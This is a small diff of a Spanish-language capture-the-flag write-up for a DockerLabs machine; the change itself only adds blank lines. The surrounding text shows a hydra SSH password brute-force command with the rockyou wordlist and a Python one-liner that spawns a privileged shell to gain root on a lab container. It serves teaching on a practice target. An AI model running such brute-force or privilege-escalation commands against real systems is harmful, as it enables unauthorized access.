@@ -102,16 +102,19 @@ sudo hydra -l jerry -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10
 
 #### find
 ![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/704a0939-57c9-41b3-aee5-ca48eedd151a)
+
 Despues de hacer el tratamiento de la TTY. Vemos que tenemos permisos de python y perl.
 
 #### Python
 ![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/fc97a024-cf9f-4c8a-8e7a-596ed731dc4a)
+
 Vemos que para elevar privilegios tenemos que ejecutar el comando:
 ```python
 /usr/bin/python3.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
 ```
 
 ![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/5d95d825-48ac-444d-8f90-4ad09eb11b34)
+
 Y somos root!
 
 
